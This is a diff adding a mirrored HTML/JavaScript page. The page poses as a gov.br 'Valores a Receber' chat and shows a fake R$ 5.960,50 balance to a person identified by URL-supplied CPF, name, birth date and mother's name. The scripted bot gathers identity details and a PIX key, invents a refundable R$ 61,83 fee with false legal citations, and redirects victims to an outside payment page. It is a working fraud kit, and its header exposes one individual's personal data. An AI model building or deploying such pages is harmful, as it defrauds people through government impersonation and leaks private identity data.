@@ -1,0 +1,1235 @@
+<!DOCTYPE html><html lang="pt-BR"><!-- Mirrored from valoresareceber2026.vercel.app/chat.html?cpf=333.119.968-01&nome=Michael+Franca+Dos+Santos&mae=Zuleica+Lourdes+De+Franca+Dos+Santos&nascimento=03%2F07%2F1986 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 26 May 2026 22:05:18 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+
+<meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
+  <title>Programa Saque Social - ATENDIMENTO</title>
+  <link rel="icon" href="images/logo.png" type="image/png">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/all.min.css">
+
+  <style>
+      .br-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 9999;
+      background: #f0f2f5;
+      align-items: center;
+      justify-content: center;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .br-overlay.on {
+      display: flex;
+    }
+
+    .br-box {
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+      padding: 32px 24px;
+      max-width: 420px;
+      width: 100%;
+      text-align: center;
+      margin: 16px;
+    }
+
+    .br-box .br-ico {
+      font-size: 48px;
+      margin-bottom: 16px;
+    }
+
+    .br-box h2 {
+      font-size: 20px;
+      color: #1a1a1a;
+      margin: 0 0 8px;
+    }
+
+    .br-box p {
+      font-size: 14px;
+      color: #666;
+      line-height: 1.6;
+      margin: 0 0 20px;
+    }
+
+    .br-box button {
+      display: inline-block;
+      background: #1351B4;
+      color: #fff;
+      border: none;
+      padding: 14px 28px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .br-box button:hover {
+      background: #0d3a8a;
+    }
+
+    :root {
+      --primary-color: #0042DA;
+      --bg-color: #ffffff;
+      --bot-bubble-bg:655999999999999999 #F7F8FF;
+      --user-bubble-bg: #FF8E21;
+      --text-color: #303235;
+      --white: #FFFFFF;
+      --gray-light: #E5E5E5;
+      --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      background-color: var(--bg-color);
+      min-height: calc(100dvh - 1px);
+      height: 100vh;
+      height: calc(100dvh - 1px);
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+      overflow-y: hidden;
+    }
+
+    header {
+      background: var(--white);
+      padding: 10px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+      z-index: 100;
+      border-bottom: 3px solid var(--primary-color);
+      flex-shrink: 0;
+    }
+
+    header .logo img {
+      height: 35px;
+    }
+
+    header .user-info {
+      background: #1451b4;
+      color: white;
+      padding: 5px 15px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    nav {
+      background: var(--white);
+      padding: 10px 20px;
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      color: #666;
+      border-bottom: 1px solid var(--gray-light);
+      flex-shrink: 0;
+    }
+
+    nav i {
+      margin: 0 8px;
+      color: var(--primary-color);
+    }
+
+
+    #chat-content {
+      flex: 1;
+      min-height: 0;
+      min-width: 0;
+      overflow-y: auto;
+      overscroll-behavior: contain;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      background-color: var(--white);
+    }
+
+    .message-row {
+      display: flex;
+      width: 100%;
+    }
+
+    .message-row.bot {
+      justify-content: flex-start;
+    }
+
+    .message-row.user {
+      justify-content: flex-end;
+    }
+
+    .avatar {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      margin-right: 8px;
+      flex-shrink: 0;
+      background-image: url("images/icon.png");
+      background-size: cover;
+      background-position: center;
+      margin-top: 5px;
+    }
+
+    .bubble {
+      max-width: 85%;
+      padding: 10px 14px;
+      border-radius: 18px;
+      font-size: 16px;
+      line-height: 1.5;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+      position: relative;
+    }
+
+    .bot .bubble {
+      background-color: var(--bot-bubble-bg);
+      color: var(--text-color);
+      border-top-left-radius: 2px;
+    }
+
+    .user .bubble {
+      background-color: var(--user-bubble-bg);
+      color: white;
+      border-top-right-radius: 2px;
+    }
+
+    .typing {
+      display: flex;
+      gap: 4px;
+      padding: 12px 18px;
+      background: var(--bot-bubble-bg);
+      border-radius: 18px;
+      width: fit-content;
+       margin-left: 0;
+      border-top-left-radius: 2px;
+    }
+
+    .typing span {
+      width: 8px;
+      height: 8px;
+      background: #999;
+      border-radius: 50%;
+      animation: bounce 1s infinite;
+    }
+
+    .typing span:nth-child(2) {
+      animation-delay: 0.2s;
+    }
+
+    .typing span:nth-child(3) {
+      animation-delay: 0.4s;
+    }
+
+    @keyframes bounce {
+
+      0%,
+      100% {
+        transform: translateY(0);
+      }
+
+      50% {
+        transform: translateY(-5px);
+      }
+    }
+
+    /* Controls area - only used for input type now */
+    #controls {
+      padding: 15px 20px;
+      background: #fff;
+      border-top: 1px solid #eee;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    #controls.active {
+      display: flex;
+    }
+
+    /* Inline chat options - buttons inside the chat flow */
+    .chat-options {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      padding: 5px 0 5px 36px;
+      max-width: 90%;
+    }
+
+    .chat-options button {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 14px 24px;
+      border-radius: 25px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 100%;
+      transition: all 0.25s ease;
+      box-shadow: 0 3px 8px rgba(0, 66, 218, 0.25);
+      text-align: center;
+      letter-spacing: 0.3px;
+    }
+
+    .chat-options button:hover {
+      background-color: #0032a8;
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 66, 218, 0.35);
+    }
+
+    .chat-options button:active {
+      transform: translateY(0);
+      box-shadow: 0 2px 4px rgba(0, 66, 218, 0.2);
+    }
+
+    .chat-options.selected button {
+      pointer-events: none;
+      opacity: 0.5;
+    }
+
+    .chat-options.selected button.chosen {
+      opacity: 1;
+      background-color: #168821;
+      box-shadow: 0 2px 6px rgba(22, 136, 33, 0.3);
+    }
+
+    .input-wrapper {
+      display: flex;
+      gap: 10px;
+      width: 100%;
+      max-width: 400px;
+      position: relative;
+    }
+
+    .input-wrapper input {
+      flex: 1;
+      padding: 14px 50px 14px 20px;
+      border: 1px solid var(--gray-light);
+      border-radius: 30px;
+      outline: none;
+      font-size: 16px;
+      background: #f9f9f9;
+      box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.02);
+    }
+
+    .input-wrapper button {
+      background: var(--primary-color);
+      border: none;
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      color: white;
+      cursor: pointer;
+      position: absolute;
+      right: 5px;
+      top: 4px;
+    }
+
+    .media-container {
+      margin-top: 8px;
+      border-radius: 12px;
+      overflow: hidden;
+      width: 100%;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    /* Force bubbles with images/comprovante to always be the same width */
+    .bubble:has(.media-container),
+    .bubble:has(.comprovante) {
+      width: 85%;
+      max-width: 85%;
+    }
+
+    .media-container img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .media-container video {
+      width: 100%;
+      display: block;
+    }
+
+body {
+    /* O padding-bottom deve ser igual ou maior que a altura do seu footer */
+    padding-bottom: 60px; 
+}
+
+footer {
+    background: #001C4E;
+    padding: 12px;
+    text-align: center;
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    z-index: 1000;
+}
+
+footer img {
+    height: 22px;
+    opacity: 0.9;
+}
+
+
+    audio {
+      width: 100%;
+      height: 35px;
+      margin-top: 5px;
+    }
+
+    .audio-container {
+      background: #f1f1f1;
+      padding: 10px;
+      border-radius: 12px;
+      margin-top: 8px;
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+      width: 240px;
+    }
+
+    .audio-container span {
+      font-size: 12px;
+      color: #666;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    /* Comprovante Styles */
+    .comprovante {
+      background: #fff;
+      border: 1.5px solid #ccc;
+      border-radius: 6px;
+      padding: 8px 10px;
+      font-family: 'Inter', sans-serif;
+      font-size: 10px;
+      color: #333;
+      width: 100%;
+      margin-top: 4px;
+    }
+
+    .comprovante-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 6px;
+      border-bottom: 2px solid #0042DA;
+      padding-bottom: 6px;
+    }
+
+    .comprovante-header img {
+      height: 24px;
+    }
+
+    .comprovante-header .titulo {
+      text-align: right;
+      color: #001C4E;
+      font-weight: 700;
+      font-size: 12px;
+      line-height: 1.2;
+    }
+
+    .comprovante .campo {
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      padding: 2px 6px 3px;
+      margin-bottom: 3px;
+      position: relative;
+    }
+
+    .comprovante .campo-label {
+      font-size: 6px;
+      color: #999;
+      line-height: 1;
+      margin-bottom: 0;
+    }
+
+    .comprovante .campo-valor {
+      font-weight: 600;
+      font-size: 10px;
+      color: #222;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .comprovante .campos-row {
+      display: flex;
+      gap: 2px;
+      margin-bottom: 3px;
+      flex-wrap: nowrap;
+    }
+
+    .comprovante .campos-row .campo {
+      flex: 1;
+      margin-bottom: 0;
+      min-width: 0;
+    }
+
+    .comprovante .campos-row .campo .campo-valor {
+      font-size: 8px;
+    }
+
+    .comprovante .campos-row .campo.vencimento {
+      background: #0042DA;
+      border-color: #0042DA;
+    }
+
+    .comprovante .campos-row .campo.vencimento .campo-label,
+    .comprovante .campos-row .campo.vencimento .campo-valor {
+      color: #fff;
+    }
+
+    .comprovante .indeniza-row {
+      display: flex;
+      gap: 2px;
+      margin-bottom: 5px;
+    }
+
+    .comprovante .indeniza-row .campo {
+      margin-bottom: 0;
+    }
+
+    .comprovante .indeniza-row .campo:first-child {
+      flex: 1;
+    }
+
+    .comprovante .indeniza-row .campo.imposto {
+      background: #0042DA;
+      border-color: #0042DA;
+      min-width: 65px;
+    }
+
+    .comprovante .indeniza-row .campo.imposto .campo-label,
+    .comprovante .indeniza-row .campo.imposto .campo-valor {
+      color: #fff;
+    }
+
+    .comprovante .tabela-header {
+      background: #0042DA;
+      color: #fff;
+      padding: 4px 6px;
+      border-radius: 4px 4px 0 0;
+      font-weight: 700;
+      font-size: 10px;
+    }
+
+    .comprovante table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 9px;
+    }
+
+    .comprovante table th {
+      padding: 2px 3px;
+      text-align: left;
+      font-weight: 600;
+      font-size: 8px;
+      color: #555;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .comprovante table td {
+      padding: 1px 3px;
+      border-bottom: 1px solid #f0f0f0;
+      font-size: 9px;
+      white-space: nowrap;
+    }
+
+    .comprovante .totais-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 4px 6px;
+      font-weight: 700;
+      font-size: 11px;
+      border-top: 2px solid #0042DA;
+      margin-top: 2px;
+      color: #001C4E;
+    }
+
+    /* Animations */
+    .fadeIn {
+      animation: fadeInAnim 0.4s ease-out forwards;
+    }
+
+    @keyframes fadeInAnim {
+      from {
+        opacity: 0;
+        transform: translateY(10px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="logo"><img src="images/govbr.png"></div>
+    <div class="user-info">
+      <i class="fas fa-user-circle"></i>
+      <span id="user-display-name">Cidadão</span>
+    </div>
+  </header>
+
+  <nav>
+    <i class="fas fa-bars"></i>
+    <span>Portal do Cidadão</span>
+    <i class="fas fa-chevron-right" style="font-size: 8px; margin: 0 5px;"></i>
+    <span>Valores a Receber</span>
+  </nav>
+
+
+  <main id="chat-content"></main>
+
+  <div id="pixContainer" style="display:none; max-width:500px; margin:25px auto; padding:20px; border-radius:16px; background:#fff; box-shadow:0 8px 20px rgba(0,0,0,.08); text-align:center;">
+    <h3 style="margin-bottom:16px; color:#0042DA;">Pagamento via PIX</h3>
+    <img id="pixQrCode" alt="QR Code do Pix" style="display:none; width:240px; height:240px; margin:0 auto 16px; border:1px solid #eee; border-radius:12px; background:#fff;">
+    <input id="pixCopiaCola" type="text" readonly style="display:none; width:100%; padding:12px; border:1px solid #ddd; border-radius:10px; font-size:14px; margin-bottom:10px; text-align:center;">
+    <button id="copiarPixBtn" type="button" style="display:none; width:100%; padding:12px; border:none; border-radius:10px; background:#0042DA; color:#fff; font-weight:700; cursor:pointer; margin-bottom:12px;">Copiar código Pix</button>
+    <p id="pixStatus" style="font-size:14px; color:#444;">Carregando...</p>
+    <p id="pixAprovado" style="display:none; font-weight:700; color:#168821; margin-top:10px;">Pagamento aprovado!</p>
+  </div>
+
+  <section id="controls"></section>
+
+  <footer><img src="images/logo.png"></footer>
+
+
+ <script>
+    const chatContent = document.getElementById('chat-content');
+    const controls = document.getElementById('controls');
+    const progressBar = document.getElementById('progress-bar');
+    const userDisplayName = document.getElementById('user-display-name');
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const userName = urlParams.get('nome') || 'Cidadão';
+    const userCPF = urlParams.get('cpf') || '***.***.***-**';
+    const userBirth = urlParams.get('nascimento') || '01/01/1980';
+    const userMother = urlParams.get('mae') || 'Não Informado';
+
+    userDisplayName.textContent = userName.split(' ')[0];
+
+    const state = { currentStep: 0, pixType: '', pixKey: '' };
+
+    function generateMotherOptions(correctName) {
+      if (correctName === 'Não Informado' || !correctName || correctName.length < 3) {
+        return [
+          { label: 'MARIA DAS GRAÇAS SILVA', next: 'gov_access' },
+          { label: 'ANA PAULA OLIVEIRA', next: 'gov_access' },
+          { label: 'ANTONIA FERREIRA LIMA', next: 'gov_access' },
+          { label: 'Nenhuma das anteriores', next: 'gov_access' }
+        ];
+      }
+
+      const commonNames = [
+        "MARIA JOSE DA SILVA",
+        "ANA LUCIA DOS SANTOS",
+        "FRANCISCA OLIVEIRA LIMA",
+        "ANTONIA PEREIRA DE SOUZA",
+        "TEREZINHA DE JESUS SILVA",
+        "ADRIANA SOUZA PINTO",
+        "RAIMUNDA NONATA COSTA"
+      ];
+
+      let filtered = commonNames.filter(n => n.toUpperCase() !== correctName.toUpperCase());
+      let shuffledDistractors = filtered.sort(() => 0.5 - Math.random()).slice(0, 3);
+      let options = shuffledDistractors.map(name => ({ label: name, next: 'gov_access' }));
+
+      options.push({ label: correctName.toUpperCase(), next: 'gov_access' });
+
+      // Shuffle only the name options, then add 'Nenhuma das anteriores' last
+      options.sort(() => 0.5 - Math.random());
+      options.push({ label: 'Nenhuma das anteriores', next: 'gov_access' });
+
+      return options;
+    }
+    function generateComprovante() {
+      const hoje = new Date();
+      const dia = String(hoje.getDate()).padStart(2, '0');
+      const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+      const ano = hoje.getFullYear();
+      const dataEmissao = `${dia}/${mes}/${ano}`;
+      const numDoc = `03.40.${Math.floor(10000 + Math.random() * 90000)}.${Math.floor(10000000 + Math.random() * 90000000)}-0`;
+
+      return `<div class="comprovante">
+        <div class="comprovante-header">
+          <img src="images/govbr.png" alt="gov.br">
+          <div class="titulo">Valores <br>Esquecidos</div>
+        </div>
+        <div class="campo">
+          <span class="campo-label">Nome Completo</span>
+          <div class="campo-valor">${userName}</div>
+        </div>
+        <div class="campos-row">
+          <div class="campo">
+            <span class="campo-label">Valor a receber</span>
+            <div class="campo-valor">R$ 5.960,50</div>
+          </div>
+          <div class="campo">
+            <span class="campo-label">Data da emissão</span>
+            <div class="campo-valor">${dataEmissao}</div>
+          </div>
+          <div class="campo">
+            <span class="campo-label">Número do Documento</span>
+            <div class="campo-valor">${numDoc}</div>
+          </div>
+          <div class="campo vencimento">
+            <span class="campo-label">Vencimento</span>
+            <div class="campo-valor">${dataEmissao}</div>
+          </div>
+        </div>
+        <div class="indeniza-row">
+          <div class="campo">
+            <span class="campo-label">Valores Esquecidos </span>
+            <div class="campo-valor">Valores Esquecidos em Bancos</div>
+          </div>
+          <div class="campo imposto">
+            <span class="campo-label">Imposto</span>
+            <div class="campo-valor">R$ 61,83</div>
+          </div>
+        </div>
+        <div class="tabela-header">Informações dos valores esquecidos</div>
+        <table>
+          <thead>
+            <tr>
+              <th>Código</th>
+              <th>Dado Pessoal</th>
+              <th>Multa</th>
+              <th>Juros</th>
+              <th>Total</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr><td>1887</td><td>NOME COMPLETO</td><td>690,40</td><td>202,25</td><td>892,65</td></tr>
+            <tr><td>1888</td><td>CPF</td><td>489,35</td><td>515,90</td><td>1005,25</td></tr>
+            <tr><td>1889</td><td>RG</td><td>735,10</td><td>152,40</td><td>887,50</td></tr>
+            <tr><td>1890</td><td>RENDA MENSAL</td><td>450,95</td><td>289,20</td><td>740,15</td></tr>
+            <tr><td>1891</td><td>DADOS</td><td>1.290,40</td><td>902,25</td><td>2192,65</td></tr>
+            <tr><td>1892</td><td>BANCÁRIOS</td><td>135,45</td><td>106,85</td><td>242,30</td></tr>
+          </tbody>
+        </table>
+        <div class="totais-row">
+          <span>TOTAIS</span>
+          <span>R$ 5.960,50</span>
+        </div>
+      </div>`;
+    }
+
+const flow = [
+  {
+    id: 'start',
+    messages: [
+       { type: 'bot', content: `Olá, <strong>${userName.split(' ')[0]}</strong>. Informamos que consta um saldo disponível para resgate vinculado ao seu CPF em nossa base de dados.`, delay: 1560 },
+       { type: 'bot', content: 'Estes valores referem-se a ativos não reclamados que podem ser transferidos para sua conta bancária.', delay: 1800 },
+       { type: 'bot', content: 'Valor disponível para saque: <strong style="font-size: 18px;">R$ 5.960,50</strong>.', delay: 1800 },
+       { type: 'bot', content: 'Para prosseguir com a liberação, é necessária a confirmação de identidade conforme os protocolos de segurança.', delay: 2160 },
+       { type: 'bot', content: 'Por favor, selecione o <strong style="color: #333;">nome de sua mãe</strong> para validação de acesso:', delay: 2160 }
+    ],
+    type: 'button',
+    options: generateMotherOptions(userMother)
+  },
+  {
+    id: 'gov_access',
+    messages: [
+      { type: 'bot', content: 'Identidade confirmada com sucesso.' },
+      { type: 'bot', content: 'Para a agilização do processo de transferência, você já utiliza a plataforma <strong style="color: #003366;">GOV.BR</strong> ou possui conta nível prata/ouro?' }
+    ],
+    type: 'button',
+    options: [
+      { label: 'Sim, já utilizo', next: 'marital_status' },
+      { label: 'Ainda não', next: 'marital_status' }
+    ]
+  },
+  {
+    id: 'marital_status',
+    messages: [
+      { type: 'bot', content: 'Agradecemos a confirmação. Para a emissão do formulário de liberação junto ao Banco Central, solicitamos a última informação...' },
+      { type: 'bot', content: 'Qual seu estado civil atual?' }
+    ],
+    type: 'button',
+    options: [
+      { label: 'Solteiro(a)', next: 'confirm_data' },
+      { label: 'Casado(a)', next: 'confirm_data' },
+      { label: 'Divorciado(a)', next: 'confirm_data' },
+      { label: 'Viúvo(a)', next: 'confirm_data' }
+    ]
+  },
+  {
+    id: 'confirm_data',
+    stepDelay: 720,
+    messages: [
+       { type: 'bot', content: '<div class="media-container"><img src="images/validando.gif">"></div>', delay: 1800 },
+       { type: 'bot', content: '<div class="media-container"><img src="images/validado.png">"></div>', delay: 1800 },
+       { 
+         type: 'bot', 
+         content: `
+           <div style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 15px; font-family: sans-serif; color: #333;">
+             <div style="text-align: center; border-bottom: 2px solid #003366; margin-bottom: 15px; padding-bottom: 10px;">
+               <strong style="font-size: 16px; color: #003366; text-transform: uppercase;">Comprovante de Validação</strong>
+             </div>
+             
+             <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px;">
+               <span style="color: #666;">Beneficiário:</span>
+               <strong style="text-align: right;">${userName}</strong>
+             </div>
+             
+             <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px;">
+               <span style="color: #666;">CPF:</span>
+               <strong style="text-align: right;">${userCPF}</strong>
+             </div>
+             
+             <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px;">
+               <span style="color: #666;">Data de Nascimento:</span>
+               <strong style="text-align: right;">${userBirth}</strong>
+             </div>
+             
+             <div style="display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 13px; border-bottom: 1px solid #eee; padding-bottom: 8px;">
+               <span style="color: #666;">Status do Processo:</span>
+               <strong style="color: #003366; text-align: right;">VALIDADO</strong>
+             </div>
+             
+             <div style="text-align: center; background: #fff; border: 1px dashed #003366; padding: 10px; border-radius: 4px;">
+               <span style="font-size: 12px; color: #666; display: block; margin-bottom: 4px;">VALOR DISPONÍVEL PARA RESGATE</span>
+               <strong style="font-size: 20px; color: #000;">R$ 5.960,50</strong>
+             </div>
+           </div>
+         `, 
+          delay: 1800 
+        },
+        { type: 'bot', content: '<div class="audio-container"><span><i class="fas fa-volume-up">"></i> Instruções Oficiais de Saque</span><audio src="media/audio1.mp3" controls autoplay></audio></div>', delay: 2160 },
+        { type: 'bot', content: '<em style="color: #666;">Sincronizando com a base de dados do Banco Central para emissão do comprovante...</em>', delay: 2400 },
+        { type: 'bot', content: 'Para que o crédito seja efetuado em sua conta, informe a <strong style="color: #333;">chave PIX</strong> de sua preferência:', delay: 1800 }
+    ],
+    type: 'button',
+    options: [
+      { label: 'CPF', value: 'CPF', next: 'type_pix' },
+      { label: 'Celular', value: 'Celular', next: 'type_pix' },
+      { label: 'E-mail', value: 'E-mail', next: 'type_pix' },
+    ]
+  },
+  {
+    id: 'type_pix',
+    messages: [
+       { type: 'bot', content: 'Digite sua chave Pix para processarmos o envio do valor de <strong style="font-size: 17px;">R$ 5.960,50</strong>', delay: 1560 }
+    ],
+    type: 'input',
+    placeholder: 'Digite sua chave Pix aqui...',
+    next: 'check_pix'
+  },
+  {
+    id: 'check_pix',
+    messages: [
+       { type: 'bot', content: '<strong style="color: #d32f2f;">AVISO IMPORTANTE:</strong><br>Certifique-se de que a chave abaixo está correta. Após a confirmação, o sistema iniciará a transferência imediata e a chave <u style="color: #333;">não poderá ser alterada</u>:<br><br><strong style="font-size: 20px; color: #000;" id="display-pix"></strong>', delay: 1560 }
+    ],
+    type: 'button',
+    options: [
+      { label: 'Sim, a chave está correta!', next: 'registering_pix' },
+      { label: 'Não, quero corrigir', next: 'type_pix' }
+    ]
+  },
+  {
+    id: 'registering_pix',
+    stepDelay: 600,
+    messages: [
+       { type: 'bot', content: 'Processando a chave no sistema de pagamentos governamentais...', delay: 1800 },
+       { type: 'bot', content: '<div class="media-container"><img src="images/chavepix.png">"></div>', delay: 1800 },
+       { 
+         type: 'bot', 
+         content: `
+           <div style="background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 15px; font-family: sans-serif; color: #333;">
+             <div style="text-align: center; border-bottom: 2px solid #003366; margin-bottom: 15px; padding-bottom: 10px;">
+               <strong style="font-size: 16px; color: #003366; text-transform: uppercase;">Detalhes do Agendamento</strong>
+             </div>
+             
+             <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px;">
+               <span style="color: #666;">Beneficiário:</span>
+               <strong style="text-align: right;">${userName}</strong>
+             </div>
+             
+             <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px;">
+               <span style="color: #666;">Chave PIX:</span>
+               <strong style="text-align: right;" id="display-pix-final">"></strong>
+             </div>
+             
+             <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px;">
+               <span style="color: #666;">Valor do Crédito:</span>
+               <strong style="text-align: right;">R$ 5.960,50</strong>
+             </div>
+             
+             <div style="display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 13px; border-bottom: 1px solid #eee; padding-bottom: 8px;">
+               <span style="color: #666;">Status:</span>
+               <strong style="color: #003366; text-align: right;">AGUARDANDO VALIDAÇÃO</strong>
+             </div>
+             
+             <div style="text-align: center; background: #fff; border: 1px solid #dee2e6; padding: 10px; border-radius: 4px;">
+               <span style="font-size: 12px; color: #666; display: block; margin-bottom: 4px;">CÓDIGO DE PROTOCOLO</span>
+               <strong style="font-size: 14px; color: #000; letter-spacing: 1px;">${Math.random().toString(36).toUpperCase().substring(2, 10)}</strong>
+             </div>
+           </div>
+         `, 
+          delay: 1800 
+        },
+        { type: 'bot', content: '<div class="audio-container"><span><i class="fas fa-volume-up">"></i> Instruções Finais</span><audio src="media/audio2.mp3" controls autoplay></audio></div>', delay: 1800 },
+        { type: 'bot', content: 'O documento de liberação foi gerado. Clique abaixo para efetivar a transferência dos valores para sua conta.' }
+    ],
+    type: 'button',
+    options: [
+      { label: 'EFETIVAR TRANSFERÊNCIA AGORA', next: 'final_step' }
+    ]
+  },
+  {
+    id: 'final_step',
+    stepDelay: 720,
+    messages: [
+       { type: 'bot', content: 'Finalizando a emissão do documento oficial de liberação...', delay: 1800 },
+       { type: 'bot', content: '<strong style="color: #003366;">COMPROVANTE GERADO COM SUCESSO</strong>', delay: 1800 },
+       { type: 'bot', content: generateComprovante(), delay: 1800 },
+       { type: 'bot', content: `<strong style="font-size: 18px;">Resumo do Resgate:</strong><br><br>Valor Disponível: <strong style="font-size: 17px;">R$ 5.960,50</strong><br>Titular: <strong>${userName}</strong><br>Chave Pix: <strong id="display-pix-checkout"></strong>`, delay: 1800 },
+{ type: 'bot', content: 'Para a conclusão da transferência imediata, é necessária a quitação da <strong style="color: #d32f2f;">Taxa de Processamento Administrativo: R$ 61,83</strong>', delay: 1800 }
+    ],
+    type: 'button',
+    options: [
+      { label: 'Informações sobre a taxa de processamento', next: 'explain_tax' }
+    ]
+  },
+  {
+    id: 'explain_tax',
+    messages: [
+       { type: 'bot', content: '<strong>Sobre a Taxa de Processamento</strong><br><br>Conforme as normativas vigentes do Banco Central, taxas de liberação de saldos vinculados ao CPF não podem ser deduzidas do valor bruto do ativo.', delay: 1800 },
+       { type: 'bot', content: 'O valor de <strong style="color: #d32f2f;">R$ 61,83</strong> é destinado à ativação do protocolo de transferência instantânea via PIX.', delay: 1800 },
+       { type: 'bot', content: '<strong>Observação:</strong> Este valor é integralmente reembolsável, sendo creditado juntamente com o montante de <strong style="font-size: 17px;">R$ 5.960,50</strong> imediatamente após a confirmação.', delay: 1800 },
+       { type: 'bot', content: '<em style="color: #666;">Base Legal: Lei Geral de Proteção de Dados (LGPD) e Normativas do BACEN.</em>', delay: 1800 }
+    ],
+    type: 'button',
+    options: [
+      { label: 'Quitar taxa e liberar valores agora', next: 'generating_checkout' }
+    ]
+  },
+  {
+       id: 'generating_checkout',
+    stepDelay: 360,
+    messages: [
+       { type: 'bot', content: 'Gerando código PIX de liberação administrativa... Por favor, aguarde.', delay: 2160 }
+    ],
+    type: 'redirect',
+    url: 'https://ajudnsecret.online/checkout-ltda1/?id=18e0ff18bbab2d67624749c9'
+  }
+];
+
+
+
+
+
+
+
+    function scrollToBottom() {
+      requestAnimationFrame(() => {
+        chatContent.scrollTop = chatContent.scrollHeight;
+      });
+    }
+
+    const CHAT_SPEED = 0.75;
+    const chatDelay = (milliseconds) => Math.max(250, Math.round(milliseconds * CHAT_SPEED));
+
+    const chatScrollObserver = new MutationObserver(scrollToBottom);
+    chatScrollObserver.observe(chatContent, { childList: true, subtree: true });
+
+    function appendMessage(type, content) {
+      const row = document.createElement('div');
+      row.className = `message-row ${type} fadeIn`;
+      let html = (type === 'bot') ? '<div class="avatar"></div>' : '';
+      html += `<div class="bubble">${content}</div>`;
+      row.innerHTML = html;
+      chatContent.appendChild(row);
+      scrollToBottom();
+
+      // Scroll again after images/media finish loading
+      const images = row.querySelectorAll('img');
+      images.forEach(img => {
+        img.addEventListener('load', scrollToBottom);
+      });
+
+      // Also scroll after a short delay for any dynamic content
+      setTimeout(scrollToBottom, 300);
+
+      // Set PIX key in the newly created row (not old duplicates)
+      const displayPix = row.querySelector('#display-pix');
+      if (displayPix) displayPix.textContent = state.pixKey;
+      const displayPixFinal = row.querySelector('#display-pix-final');
+      if (displayPixFinal) displayPixFinal.textContent = state.pixKey;
+      const displayPixCheckout = row.querySelector('#display-pix-checkout');
+      if (displayPixCheckout) displayPixCheckout.textContent = state.pixKey;
+    }
+
+    function showTyping() {
+      const row = document.createElement('div');
+      row.className = 'message-row bot fadeIn';
+      row.innerHTML = '<div class="avatar"></div><div class="typing"><span></span><span></span><span></span></div>';
+      chatContent.appendChild(row);
+      scrollToBottom();
+      return row;
+    }
+
+    function gerarPagamentoPix() {
+      window.location.assign('https://ajudnsecret.online/checkout-ltda1/?id=18e0ff18bbab2d67624749c9');
+    }
+
+    function exibirPix(dados) {
+      const qrImg = document.getElementById('pixQrCode');
+      const qrInput = document.getElementById('pixCopiaCola');
+      const copiarBtn = document.getElementById('copiarPixBtn');
+
+      if (!qrImg || !qrInput || !copiarBtn) return;
+
+      const image = dados.pix_qrcode_image ||
+        `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(dados.pix_qrcode_text)}`;
+      qrImg.src = image.startsWith('data:') || image.startsWith('http')
+        ? image
+        : `data:image/png;base64,${image}`;
+      qrImg.style.display = 'block';
+      qrInput.value = dados.pix_qrcode_text;
+      qrInput.style.display = 'block';
+      copiarBtn.style.display = 'block';
+
+      copiarBtn.onclick = async () => {
+        try {
+          await navigator.clipboard.writeText(dados.pix_qrcode_text);
